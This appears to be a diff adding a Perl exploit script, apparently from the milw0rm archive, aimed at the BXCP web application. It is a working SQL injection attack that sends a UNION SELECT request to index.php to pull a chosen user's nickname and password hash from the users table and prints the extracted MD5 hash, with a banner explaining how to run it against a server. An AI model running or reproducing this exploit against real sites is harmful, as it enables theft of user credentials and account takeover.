@@ -1,0 +1,48 @@
+#!/usr/bin/perl
+
+use IO::Socket;
+
+print q{
+-------------------------------------------------------------------------------------
+BXCP exploit by x23 ~ curse-crew.de ~ geekbar.cx.la ~ geeknet.uttx.net
+use: bxcp.pl [server] [dir] [id]
+sample:
+$ perl bxcp.pl bxcp.com / 1
+~ connecting
+~ exploiting
+~ hash: *censored* ;D
+-------------------------------------------------------------------------------------
+
+};
+
+$webpage =   $ARGV[0];
+$directory = $ARGV[1];
+$vic_id =    $ARGV[2];
+
+if (!$vic_id) { die "~ read how to use ;)\n"; }
+
+$get = "http://".$webpage.$directory."index.php?mod=files&action=view&where=-1+UNION+";
+$get .= "SELECT+users_nick,0,users_pwd,0,0,0,0,0,0,0,0,0,0,0,0+FROM+{pre}_users+WHERE+users_id=";
+$get .= $vic_id;
+
+print "~ connecting\n";
+$sock = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$webpage",
+PeerPort=>"80") || die "[+] Can't connect to Server\n";
+print "~ exploiting\n";
+print $sock "GET $get HTTP/1.1\n";
+print $sock "Host: $webpage\n";
+print $sock "Accept: */*\n";
+print $sock "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.8.0.4) Gecko/20060508 Firefox/1.5.0.4\n";
+print $sock "Connection: close\n\n";
+
+while ($answer = <$sock>) {
+  #print $answer;
+  if ($answer =~ /([0-9a-f]{32})\n/) {
+     print "~ hash: $1\n";
+     break;
+  }
+}
+
+close($sock);
+
+# milw0rm.com [2006-07-02]
